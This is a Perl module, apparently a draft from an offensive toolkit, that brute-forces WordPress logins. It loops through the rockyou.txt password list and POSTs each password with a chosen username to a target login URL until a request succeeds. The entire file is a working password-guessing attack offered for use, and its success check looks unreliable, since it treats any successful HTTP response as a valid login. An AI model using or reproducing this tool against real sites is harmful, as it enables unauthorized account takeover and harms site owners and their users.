package Spellbook::Bruteforce::Wordpress {
    use strict;
    use warnings;
    use LWP::UserAgent;
    use HTTP::Request::Common;
    use Carp qw(croak);

    # THIS IS A DRAFT MODULE

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, $username);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "h|help"       => \$help,
            "t|target=s"   => \$target,
            "u|usarname=s" => \$username,
        );

        if ($target) {
            open(my $wordlist, "<", "./files/rockyou.txt")
                or croak "Could not open wordlist file: $!";
            my @passwords = <$wordlist>;
            close($wordlist) or croak "Could not close wordlist file: $!";

            chomp(@passwords);

            foreach my $password (@passwords) {
                my $useragent = LWP::UserAgent->new;

                my $response = $useragent -> request(POST $target, [
                    log => $username,
                    pwd => $password,
                ]);

                if ($response -> is_success) {
                    print "Successfully logged in with password: $password \n";
                    last;
                }
            }
        }

        if ($help) {
            return<<"EOT";

EOT
        }

        return 0;
    }
}

1;